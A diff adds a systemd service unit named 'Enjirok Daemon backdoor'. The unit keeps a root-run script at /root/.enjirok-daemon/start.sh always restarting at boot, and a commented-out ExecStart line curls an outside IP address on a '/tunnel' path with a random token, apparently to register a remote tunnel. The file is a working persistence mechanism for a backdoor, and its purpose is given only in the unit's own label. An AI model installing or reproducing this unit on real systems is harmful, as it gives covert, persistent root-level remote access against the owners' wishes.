@@ -1,0 +1,16 @@
+[Unit]
+Description=Enjirok Daemon backdoor
+# After=network.target
+After=network-online.target
+Wants=network-online.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=5
+ExecStart=/usr/bin/bash /root/.enjirok-daemon/start.sh
+# ExecStart=/usr/bin/curl 154.53.61.106:19027/tunnel -d "{\"token\":\""$(hexdump -vn16 -e'4/4 "%08X" 1 "\n"' /dev/urandom)"\"}" -H "content-type: application/json" -i
+
+[Install]
+WantedBy=multi-user.target
